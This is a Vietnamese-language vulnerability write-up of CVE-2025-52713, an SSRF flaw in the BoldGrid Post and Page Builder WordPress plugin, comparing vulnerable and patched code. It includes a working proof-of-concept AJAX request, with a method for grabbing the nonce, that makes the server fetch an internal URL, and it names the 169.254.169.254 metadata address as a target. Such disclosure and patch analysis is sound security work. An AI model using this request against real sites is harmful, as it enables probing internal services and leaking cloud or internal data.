# CVE-2025-52713 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Server-Side Request Forgery (SSRF)** trong plugin **BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor** cho phép kẻ tấn công thực hiện **yêu cầu giả mạo từ phía máy chủ**.
Vấn đề này ảnh hưởng đến plugin **Post and Page Builder by BoldGrid – Visual Drag and Drop Editor** từ phiên bản **chưa xác định cho đến 1.27.8**.

* **CVE ID**: [CVE-2025-52713](https://www.cve.org/CVERecord?id=CVE-2025-52713)
* **Vulnerability Type**: Server Side Request Forgery (SSRF)
* **Affected Versions**: <= 1.27.8
* **Patched Versions**: 1.27.9
* **CVSS severity**: Low (6.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin](https://wordpress.org/plugins/post-and-page-builder/advanced/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Post and Page Builder by BoldGrid – Visual Drag and Drop Editor**: **1.27.8** (vulnerable) và **1.27.9** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

```php {title="class-boldgrid-editor-ajax.php - v1.27.8" hl_lines=[2,4,8,9,10,11,12,13,16,17]}
public function get_redirect_url() {
    $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null;

    self::validate_nonce( 'image' );
    $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&fm=jpg&h=800&q=50&w=1200';

    $redirectUrls = array();
    foreach( $urls as $url ) {
        $response = wp_remote_head( $url );
        $headers = is_array( $response ) && ! empty( $response['headers'] ) ? $response['headers']->getAll() : array();
        $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false;
        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;
        $redirectUrls[ $url ] = $redirectUrl;
    }

    if ( ! empty( $redirectUrls ) ) {
        wp_send_json_success( $redirectUrls );
    } else {
        status_header( 400 );
        wp_send_json_error();
    }
}
```

Trong **phiên bản lỗi**, hàm `get_redirect_url()` nhận mảng URL từ `$_POST['urls']`, sau đó duyệt qua từng phần tử và gửi request bằng `wp_remote_head($url)` mà **không hề kiểm tra hoặc lọc dữ liệu đầu vào**. Việc này cho phép kẻ tấn công tự cung cấp URL tùy ý để máy chủ gửi yêu cầu tới các địa chỉ nội bộ như `127.0.0.1` hoặc `169.254.169.254`, dẫn đến **lỗ hổng SSRF**. Ngoài ra, do không giới hạn `timeout` hay số lần `redirection`, hàm còn có thể bị lợi dụng để gây **treo hoặc tấn công từ chối dịch vụ (DoS)**.

```php {title="class-boldgrid-editor-ajax.php - v1.27.9" hl_lines=[2,4,7,8,9,10,11,12,13,14,15,18,19]}
public function get_redirect_url() {
    $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null;

    self::validate_nonce( 'image' );
    $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop&fm=jpg&h=800&q=50&w=1200';
    $redirectUrls = array();
    foreach( $urls as $url ) {
        $response = wp_safe_remote_head( esc_url_raw( $url ), array(
            'timeout'     => 5,
            'redirection' => 5,
        ) );
        $headers = is_array( $response ) && ! empty( $response['headers'] ) ? $response['headers']->getAll() : array();
        $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false;
        $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false;
        $redirectUrls[ $url ] = $redirectUrl;
    }

    if ( ! empty( $redirectUrls ) ) {
        wp_send_json_success( $redirectUrls );
    } else {
        status_header( 400 );
        wp_send_json_error();
    }
}
```

Bản vá đã thay `wp_remote_head()` bằng `wp_safe_remote_head()` kết hợp với `esc_url_raw()` để lọc và chỉ cho phép URL hợp lệ, đồng thời bổ sung các tham số bảo vệ như `timeout => 5` và `redirection => 5`. Nhờ đó, hàm chỉ gửi request đến các host an toàn, ngăn SSRF và hạn chế các rủi ro về hiệu năng.

### Vulnerable Code 

Hàm `self::validate_nonce( 'image' );` trong đoạn mã được gọi để **xác thực nonce** — một cơ chế bảo vệ của WordPress nhằm ngăn **CSRF (Cross-Site Request Forgery)**.

```php {title="class-boldgrid-editor-ajax.php - v1.27.8" hl_lines=[2,3,5]}
public static function validate_nonce( $name ) {
    $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ?
        $_POST[ self::$nonces[ $name ] ] : null;

    $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] );

    if ( ! $valid ) {
        status_header( 401 );
        wp_send_json_error();
    }
}
```

Cụ thể, plugin định nghĩa một mảng tĩnh `$nonces` chứa các tên nonce tương ứng với từng hành động:

```php {title="class-boldgrid-editor-ajax.php - v1.27.8" hl_lines=[2]}
protected static $nonces = array(
    'image' => 'boldgrid_gridblock_image_ajax_nonce',
    'setup' => 'boldgrid_editor_setup',
    'gridblock_save' => 'boldgrid_editor_gridblock_save',
);
```

Khi hàm `validate_nonce('image')` được gọi, nó sẽ:

1. Lấy giá trị nonce từ request POST theo key `boldgrid_gridblock_image_ajax_nonce`.
2. Kiểm tra giá trị này bằng `wp_verify_nonce()`.
3. Nếu nonce không hợp lệ (nghĩa là request không được khởi tạo từ trang WordPress hợp pháp), hàm sẽ trả về **HTTP 401 Unauthorized** và dừng xử lý thông qua `wp_send_json_error()`.

{{< admonition tip >}}
Khi tìm kiếm từ khóa `boldgrid_gridblock_image_ajax_nonce` trong mã nguồn plugin, ta thấy giá trị này được gán từ biến JavaScript `BoldgridEditor.grid_block_nonce`.

![Nonce](nonce.png "Giá trị của nonce trong JS")

Do đây là yêu cầu AJAX được gửi từ phía client, nên để lấy nonce hiện tại, ta có thể mở **Console** trên trình duyệt và gọi:
`BoldgridEditor.grid_block_nonce` khi tạo post bằng plugin này.

![Nonce value](nonce_value.png "Giá trị của nonce trong console")
{{< /admonition >}}


`get_redirect_url()` được đăng ký làm callback cho action hook:

```php
add_action( 'wp_ajax_boldgrid_redirect_url', array( $boldgrid_editor_ajax, 'get_redirect_url' ) );
```

Điều này có nghĩa là: Khi client gửi request AJAX đến endpoint `/wp-admin/admin-ajax.php?action=boldgrid_redirect_url` thì `get_redirect_url()` sẽ được gọi

### Flow

{{< mermaid >}}
graph TD
A["Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']"] --> B["wp_ajax_boldgrid_redirect_url → get_redirect_url()"]
B --> C["self::validate_nonce('image')"]
C --> D["read $_POST['urls']"]
D --> E["foreach $url"]
E --> F["wp_remote_head($url)  ← SSRF sink"]
F --> G["extract headers['location'] → $redirectUrls"]
G --> H{"$redirectUrls not empty?"}
H -- Yes --> I["wp_send_json_success($redirectUrls)"]
H -- No --> J["wp_send_json_error()"]
{{< /mermaid >}}

## Exploit

### Local Server
Tạo local service đơn giản bằng python

```py
from flask import Flask, send_from_directory
import os

BASE_DIR = os.path.abspath(os.getcwd())
app = Flask(__name__)

@app.route('/metadata')
def metadata():
    return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)
```

```json {title="metadata.json"}
{
  "content": "Internal service data"
}
```

### Proof of Concept (PoC)

Gửi POST request với URL trỏ đến local service:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0
...

action=boldgrid_redirect_url&urls[0]=http://localhost:8001/metadata&boldgrid_gridblock_image_ajax_nonce=482dbb1ed2
```

**Result**:

![Result](result.png "Nội dung đọc được từ local service")

## Conclusion

Lỗ hổng **CVE-2025-52713** xuất phát từ việc hàm `get_redirect_url()` trong plugin **BoldGrid Post and Page Builder** (≤ 1.27.8) gửi yêu cầu HTTP đến URL do người dùng cung cấp mà không kiểm tra hoặc giới hạn, dẫn đến **SSRF**.
Kẻ tấn công có quyền **Contributor** cùng nonce hợp lệ có thể buộc máy chủ gửi request đến các địa chỉ nội bộ.
Bản vá (1.27.9) khắc phục bằng cách dùng `esc_url_raw()` và `wp_safe_remote_head()` với giới hạn `timeout` và `redirection`, ngăn chặn yêu cầu nguy hiểm.

## Key takeaways

* Nguyên nhân: thiếu xác thực và lọc đầu vào URL.
* Nonce chỉ chống CSRF, không ngăn SSRF.
* Mức độ ảnh hưởng: **Low (6.4)** nhưng có thể dẫn đến rò rỉ dữ liệu nội bộ.
* Cập nhật lên **v1.27.9** để vá lỗi.
* Khi phát triển, nên luôn dùng API an toàn (`wp_safe_remote_*`) và lọc URL bằng `esc_url_raw()`.

## References

[SSRF (Server Side Request Forgery) — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[ WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin <= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) ](https://patchstack.com/database/wordpress/plugin/post-and-page-builder/vulnerability/wordpress-post-and-page-builder-by-boldgrid-visual-drag-and-drop-editor-plugin-1-27-8-server-side-request-forgery-ssrf-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-01-cve-2025-52713/  

